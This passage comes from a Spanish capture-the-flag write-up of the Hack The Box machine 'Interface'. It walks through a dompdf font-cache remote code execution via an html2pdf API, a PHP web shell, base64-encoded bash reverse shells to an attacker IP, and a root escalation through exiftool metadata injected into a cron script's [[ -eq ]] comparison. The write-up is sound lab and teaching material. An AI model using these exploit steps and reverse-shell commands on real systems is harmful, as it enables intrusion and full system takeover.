+</code></pre></div><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Buscando vulnerabilidades, podemos encontrar un <em>exploit</em> de ejecución remota de comandos (RCE) para <a href="https://github.com/dompdf/dompdf"><code>dompdf</code></a> en <a href="https://github.com/positive-security/dompdf-rce"><code>dompdf-rce</code></a> (más detalles en <a href="https://positive.security/blog/dompdf-rce">positive.security</a>):</p><p><img src="/images/HTB/Interface/Interface-9.webp" alt="Interface 9"></p><p><em>Fuente</em>: <a href="https://positive.security/blog/dompdf-rce">https://positive.security/blog/dompdf-rce</a></p><p>Sin embargo, para explotar esta vulnerabilidad, debemos interactuar con la aplicación.</p><h3 id="encontrando-una-api">Encontrando una API</h3><p>Tal vez, dado que el nombre de la máquina es &ldquo;Interface&rdquo;, debemos encontrar una API (<em>Application Programming Interface</em>).Si volvemos a la fase de enumeración, podemos decirle a <code>ffuf</code> que capture todos los códigos de estado y filtre los recursos que devuelvan tamaño cero:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://prd.m.rendering-api.interface.htb/FUZZ -mc all -fs 0  
+
+<span class="code-dark-yellow">[Status: 404, Size: 50, Words: 3, Lines: 1, Duration: 56ms]</span>
+    * FUZZ: api
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 54ms]</span>
+    * FUZZ: .
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 55ms]</span>
+    * FUZZ: vendor
+</code></pre></div><p>Ahora tenemos otro <em>endpoint</em> que parece prometedor:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> prd.m.rendering-api.interface.htb/api
+{"status":"404","status_text":"route not defined"}
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> prd.m.rendering-api.interface.htb/api/asdf -i  
+HTTP/1.1 404 Not Found
+<span class="code-white">Server</span>: nginx/1.14.0 (Ubuntu)
+<span class="code-white">Date</span>: Sun, 12 Feb 2023 14:23:18 GMT
+<span class="code-white">Content-Type</span>: application/json
+<span class="code-white">Transfer-Encoding</span>: chunked
+<span class="code-white">Connection</span>: keep-alive
+
+{"status":"404","status_text":"route not defined"}
+</code></pre></div><p>Necesitamos enumerar un poco más usando peticiones POST (ya que estamos interactuando con una API, tiene sentido usar POST al igual que GET):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://prd.m.rendering-api.interface.htb/api/FUZZ -X POST -mc all -fs 50  
+
+<span class="code-dark-yellow">[Status: 422, Size: 36, Words: 2, Lines: 1, Duration: 52ms]</span>
+    * FUZZ: html2pdf
+</code></pre></div><p>Genial, <code>/api/html2pdf</code>&mldr; Nos estamos acercando.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -X POST prd.m.rendering-api.interface.htb/api/html2pdf -i  
+HTTP/1.1 422 Unprocessable Entity
+<span class="code-white">Server</span>: nginx/1.14.0 (Ubuntu)
+<span class="code-white">Date</span>: Sun, 12 Feb 2023 14:25:48 GMT
+<span class="code-white">Content-Type</span>: application/json
+<span class="code-white">Transfer-Encoding</span>: chunked
+<span class="code-white">Connection</span>: keep-alive
+
+{"status_text":"missing parameters"}
+</code></pre></div><p>Ahora necesitamos encontrar parámetros&mldr; Más enumeración&mldr;</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://prd.m.rendering-api.interface.htb/api/html2pdf -d <span class="code-dark-yellow">'{"FUZZ":"asdf"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span> -X POST -mc all -fs 36  
+
+<span class="code-dark-green">[Status: 200, Size: 1131, Words: 116, Lines: 77, Duration: 69ms]</span>
+    * FUZZ: html
+</code></pre></div><p>Aquí lo tenemos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> prd.m.rendering-api.interface.htb/api/html2pdf -d <span class="code-dark-yellow">'{"html":"asdf"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>
+Warning: Binary output can mess up your terminal. Use "--output -" to tell
+Warning: curl to output it to your terminal anyway, or consider "--output
+Warning: &lt;FILE&gt;" to save to a file.
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> prd.m.rendering-api.interface.htb/api/html2pdf -d <span class="code-dark-yellow">'{"html":"asdf"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span> -so - | <span class="code-dark-green">file</span> -
+/dev/stdin: PDF document, version 1.7, 0 pages
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> prd.m.rendering-api.interface.htb/api/html2pdf -d <span class="code-dark-yellow">'{"html":"asdf"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span> -so - | <span class="code-dark-green">exiftool</span> - | <span class="code-dark-green">grep</span> pdf  
+File Type Extension             : <span class="code-red">pdf</span>
+MIME Type                       : application/<span class="code-red">pdf</span>
+Producer                        : dom<span class="code-red">pdf</span> 1.2.0 + CPDF
+</code></pre></div><h3 id="explotación-de-dompdf">Explotación de <code>dompdf</code></h3><p>Ahora es el momento de explotarlo siguiendo el <a href="https://github.com/positive-security/dompdf-rce">reposotirio de GitHub</a> o el <a href="https://positive.security/blog/dompdf-rce">artículo</a>.</p><p>Siguiendo el artículo, primero necesitamos crear un archivo CSS que contenga una descripción de <code>@font-face</code> con una URL en <code>src</code> que apunte a un archivo PHP malicioso:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">@font-face</span><span class="mtk1"> {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">font-family</span><span class="mtk1">: </span><span class="mtk4">'exploitfont'</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">src</span><span class="mtk1">: </span><span class="mtk7">url</span><span class="mtk1">(</span><span class="mtk4 detected-link">'http://10.10.17.44/exploit_font.php'</span><span class="mtk1">);</span>  
+<span class="mtk1">  </span><span class="mtk7 mtki">font-weight</span><span class="mtk1">: </span><span class="mtk4">'normal'</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">font-style</span><span class="mtk1">: </span><span class="mtk4">'normal'</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Este archivo PHP malicioso (<code>exploit_font.php</code>) comienza como un archivo <code>.ttf</code> válido (formato <em>TrueType Font</em>). Y en la parte inferior contiene código PHP (por defecto: <code>&lt;?php phpinfo(); ?></code>).</p><p>A continuación, necesitamos generar un PDF usando este código HTML:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">&lt;</span><span class="mtk5">link</span><span class="mtk1"> </span><span class="mtk8">rel</span><span class="mtk1">=</span><span class="mtk4">stylesheet</span><span class="mtk1"> </span><span class="mtk8">href</span><span class="mtk1">=</span><span class="mtk4 detected-link">http://10.10.17.44/exploit.css</span><span class="mtk1">&gt;</span>  
+</code></pre></div><p>Vamos a ello:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> prd.m.rendering-api.interface.htb/api/html2pdf -d <span class="code-dark-yellow">'{"html":"&lt;link rel=stylesheet href=http://10.10.17.44/exploit.css&gt;"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>  
+Warning: Binary output can mess up your terminal. Use "--output -" to tell
+Warning: curl to output it to your terminal anyway, or consider "--output
+Warning: &lt;FILE&gt;" to save to a file.
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.10.11.200 - - [] "GET /exploit.css HTTP/1.0" 200 -
+::ffff:10.10.11.200 - - [] "GET /exploit_font.php HTTP/1.0" 200 -  
+</code></pre></div><p>Ahora, necesitamos encontrar el archivo de tipografía cacheado con el contenido de PHP malicioso. En el artículo, muestra cómo se genera el nombre de archivo:</p><blockquote><p><em>The filename of a newly cached font is deterministic and based on information we have, namely the font’s name, the chosen style and a hash of its remote URL (line 9-19). The test-font from above with URL <code>http://attacker.local/test_font.ttf</code> and weight/style &ldquo;normal&rdquo; would e.g. get stored</em></p></blockquote><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">testfont_normal_d249c21fbbb1302ab53282354d462d9e.ttf  
+</code></pre></div><p>Podemos confirmar que <code>d249c21fbbb1302ab53282354d462d9e</code> es el <em>hash</em> MD5:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'http://attacker.local/test_font.ttf'</span> | <span class="code-dark-green">md5sum</span>  
+d249c21fbbb1302ab53282354d462d9e  -
+</code></pre></div><p>Entonces, en nuestro caso tenemos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'http://10.10.17.44/exploit_font.php'</span> | <span class="code-dark-green">md5sum</span>  
+9e9dc3b53bd654b44ddf200e10ff3789  -
+</code></pre></div><p>Y aquí está:</p><p><img src="/images/HTB/Interface/Interface-10.webp" alt="Interface 10"></p><p>Intentemos ejecutar comandos usando <code>system</code> en PHP:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sed</span> -i <span class="code-dark-yellow">'s/exploit_font/exploit_font_rce/g'</span> <span class="mtku">exploit.css</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">sed</span> <span class="code-dark-yellow">'s/phpinfo()/system($_GET["cmd"])/g'</span> <span class="mtku">exploit_font.php</span> &gt; exploit_font_rce.php
+
+<span class="code-cyan">$</span> <span class="code-dark-green">tail</span> -1 <span class="mtku">exploit_font_rce.php</span>
+&lt;?php system($_GET["cmd"]); ?&gt;
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> prd.m.rendering-api.interface.htb/api/html2pdf -d <span class="code-dark-yellow">'{"html":"&lt;link rel=stylesheet href=http://10.10.17.44/exploit.css&gt;"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>  
+Warning: Binary output can mess up your terminal. Use "--output -" to tell
+Warning: curl to output it to your terminal anyway, or consider "--output
+Warning: &lt;FILE&gt;" to save to a file.
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.10.11.200 - - [] "GET /exploit.css HTTP/1.0" 200 -
+::ffff:10.10.11.200 - - [] "GET /exploit_font_rce.php HTTP/1.0" 200 -  
+</code></pre></div><p>Nótese que usé otro nombre de archivo porque el servidor usa el nombre para la memoria caché, por lo que incluso si modificamos el contenido, el nombre de archivo seguiría siendo el mismo y el servidor usará el archivo de la caché.</p><p>Este es el hash MD5 actualizado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'http://10.10.17.44/exploit_font_rce.php'</span> | <span class="code-dark-green">md5sum</span>  
+39c1a35138a32c02712e18f00def33ae  -
+</code></pre></div><p>Y ahora tenemos ejecución remota de comandos:</p><p><img src="/images/HTB/Interface/Interface-11.webp" alt="Interface 11"></p><p>Entonces, es hora de obtener una <em>reverse shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i &gt;& /dev/tcp/10.10.17.44/4444 0&gt;&1'</span> | <span class="code-dark-green">base64</span>
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_39c1a35138a32c02712e18f00def33ae.php?cmd=echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx+|+base64+-d+|+bash'  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.129.151.52.
+Ncat: Connection from 10.129.151.52:45556.
+bash: cannot set terminal process group (1442): Inappropriate ioctl for device  
+bash: no job control in this shell
+www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ cd /
+cd /
+www-data@interface:/$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@interface:/$ ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+www-data@interface:/$ export TERM=xterm
+www-data@interface:/$ export SHELL=bash
+www-data@interface:/$ stty rows 50 columns 158
+</code></pre></div><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>En este punto podemos leer la <em>flag</em> <code>user.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@interface:/$ find / -name user.txt 2&gt;/dev/null  
+/home/dev/user.txt
+www-data@interface:/$ cat /home/dev/user.txt
+b632095e438a7c0ed59d1c7990106a23
+</code></pre></div><p>Enumeremos procesos en ejecución con <a href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@interface:/$ cd /tmp
+www-data@interface:/tmp$ wget -q 10.10.14.61:8000/pspy64s  
+www-data@interface:/tmp$ chmod +x pspy64s
+www-data@interface:/tmp$ ./pspy64s
+</code></pre></div><p>Después de unos segundos, vemos estos comandos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-blue">CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity</span>
+<span class="code-blue">CMD: UID=0    PID=4595   | /usr/bin/perl -w /usr/bin/exiftool -s -s -s -Producer /tmp/pspy64s</span>
+<span class="code-blue">CMD: UID=0    PID=4594   | /bin/bash /usr/local/sbin/cleancache.sh</span>
+<span class="code-blue">CMD: UID=0    PID=4593   | /bin/bash /usr/local/sbin/cleancache.sh</span>
+<span class="code-blue">CMD: UID=0    PID=4592   | /bin/sh -c /usr/local/sbin/cleancache.sh</span>
+<span class="code-blue">CMD: UID=0    PID=4591   | /usr/sbin/CRON -f</span>
+<span class="code-blue">CMD: UID=0    PID=4596   | cut -d   -f1</span>
+<span class="code-blue">CMD: UID=0    PID=4603   | /bin/bash /root/clean.sh</span>
+<span class="code-blue">CMD: UID=0    PID=4602   | /usr/sbin/CRON -f</span>
+<span class="code-blue">CMD: UID=0    PID=4601   | /bin/sh -c /root/clean.sh</span>
+<span class="code-blue">CMD: UID=0    PID=4600   | /usr/sbin/CRON -f</span>
+<span class="code-blue">CMD: UID=0    PID=4599   | /usr/sbin/CRON -f</span>
+<span class="code-blue">CMD: UID=0    PID=4604   | find /var/www/api/vendor/dompdf/dompdf/lib/fonts/ -type f -cmin -5 -exec rm {} ;</span>
+<span class="code-blue">CMD: UID=0    PID=4605   | cp /root/font_cache/dompdf_font_family_cache.php /var/www/api/vendor/dompdf/dompdf/lib/fonts/dompdf_font_family_cache.php</span>  
+</code></pre></div><p>Este comando parece raro:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/usr/bin/perl -w /usr/bin/exiftool -s -s -s -Producer /tmp/pspy64s  
+</code></pre></div><p>Obviamente, no podemos leer <code>/root/clean.sh</code>, pero sí podemos leer <code>/usr/local/sbin/cleancache.sh</code>, que es el siguiente <em>script</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#! /bin/bash</span>
+<span class="mtk1">cache_directory=</span><span class="mtk4">"/tmp"</span>
+<span class="mtk5">for</span><span class="mtk1"> cfile </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">$cache_directory</span><span class="mtk4">"</span><span class="mtk1">/</span><span class="mtk5">*;</span><span class="mtk1"> </span><span class="mtk5">do</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> [[ </span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">$cfile</span><span class="mtk4">"</span><span class="mtk1"> ]]</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>
+
+<span class="mtk1">        meta_producer=</span><span class="mtk4">$(/usr/bin/exiftool -s -s -s -Producer "</span><span class="mtk1">$cfile</span><span class="mtk4">" </span><span class="mtk5">2&gt;</span><span class="mtk4">/dev/null </span><span class="mtk5">|</span><span class="mtk4"> cut -d " " -f1)</span>  
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> [[ </span><span class="mtk4">"</span><span class="mtk1">$meta_producer</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk5">-eq</span><span class="mtk1"> </span><span class="mtk4">"dompdf"</span><span class="mtk1"> ]]</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>
+<span class="mtk1">            </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Removing </span><span class="mtk1">$cfile</span><span class="mtk4">"</span>
+<span class="mtk1">            rm </span><span class="mtk4">"</span><span class="mtk1">$cfile</span><span class="mtk4">"</span>
+<span class="mtk1">        </span><span class="mtk5">fi</span>
+
+<span class="mtk1">    </span><span class="mtk5">fi</span>
+
+<span class="mtk5">done</span>
+</code></pre></div><p>El comando anterior proviene del <em>script</em>. Emplea <code>exiftool</code> para encontrar archivos que tienen <code>dompdf</code> como metadatos de <code>Producer</code>.</p><p>Por ejemplo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@interface:/tmp$ touch test
+www-data@interface:/tmp$ exiftool -s -s -s -Producer test  
+Error: File is empty - test
+www-data@interface:/tmp$ exiftool -Producer='asdf' test
+    1 image files updated
+www-data@interface:/tmp$ exiftool -s -s -s -Producer test
+asdf
+</code></pre></div><p>Entonces, lo que hace el <em>script</em> es extraer los metadatos de <code>Producer</code> para los archivos de <code>/tmp</code> y eliminar los producidos por <a href="https://github.com/dompdf/dompdf"><code>dompdf</code></a>.</p><p>Por otro lado, la versión de <code>exiftool</code> no es vulnerable:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@interface:/tmp$ exiftool test | grep -i version  
+ExifTool Version Number         : 12.55
+</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Hay un problema con el <em>script</em> en estas líneas:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        meta_producer=</span><span class="mtk4">$(/usr/bin/exiftool -s -s -s -Producer "</span><span class="mtk1">$cfile</span><span class="mtk4">" </span><span class="mtk5">2&gt;</span><span class="mtk4">/dev/null </span><span class="mtk5">|</span><span class="mtk4"> cut -d " " -f1)</span>  
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> [[ </span><span class="mtk4">"</span><span class="mtk1">$meta_producer</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk5">-eq</span><span class="mtk1"> </span><span class="mtk4">"dompdf"</span><span class="mtk1"> ]]</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>
+<span class="mtk1">            </span><span class="mtk3"># ...</span>
+<span class="mtk1">        </span><span class="mtk5">fi</span>
+</code></pre></div><p>Buscando vulnerabilidades en Bash, encontramos <a href="https://www.vidarholen.net/contents/blog/?p=716">este artículo</a>, que muestra cómo podemos evaluar cualquier código de Bash dentro de explresiones <code>[[ ... ]]</code> (véase también <a href="https://unix.stackexchange.com/questions/172103/security-implications-of-using-unsanitized-data-in-shell-arithmetic-evaluation">unix.stackexchange.com</a>). Por lo tanto, pondremos una <em>reverse shell</em> para que <code>root</code> la ejecute:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@interface:/tmp$ cat &gt; shell.sh
+#!/bin/bash
+echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash  
+^C
+www-data@interface:/tmp$ chmod +x shell.sh
+www-data@interface:/tmp$ touch asdf
+www-data@interface:/tmp$ exiftool -Producer='x[$(/tmp/shell.sh&gt;&amp;2)]' asdf
+    1 image files updated
+</code></pre></div><p>Observe que el archivo con metadatos (<code>asdf</code>) tiene que estar antes que el <em>script</em> malicioso (<code>shell.sh</code>) en orden alfabético; si no, el <em>script</em> se eliminará antes de analizar los metadatos del archivo.</p><p>Después de unos segundos, recibimos la <em>reverse shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.129.151.52.
+Ncat: Connection from 10.129.151.52:33320.
+bash: cannot set terminal process group (4914): Inappropriate ioctl for device  
+bash: no job control in this shell
+root@interface:~# script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+root@interface:~# ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+root@interface:~# export TERM=xterm
+root@interface:~# export SHELL=bash
+root@interface:~# stty rows 50 columns 158
+</code></pre></div><p>Ahora somos <code>root</code>, por lo que podemos leer la <em>flag</em> <code>root.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@interface:~# cat root.txt
+c49dbca5c4cb7b0d911163d87319e846  
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#enumeración-del-subdominio">Enumeración del subdominio</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#encontrando-una-api">Encontrando una API</a></li><li><a href="#explotación-de-dompdf">Explotación de <code>dompdf</code></a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
+<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on 